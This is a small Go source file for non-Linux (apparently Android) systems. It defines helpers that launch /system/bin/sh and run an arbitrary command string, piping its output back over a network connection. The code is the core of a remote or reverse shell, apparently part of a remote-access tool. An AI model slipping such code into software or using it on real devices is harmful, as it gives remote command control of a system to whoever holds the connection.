// +build !linux 

package shell

import (
	"net"
	"os/exec"
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("/system/bin/sh")
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "/system/bin/sh"
	cmd := exec.Command(cmd_path, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}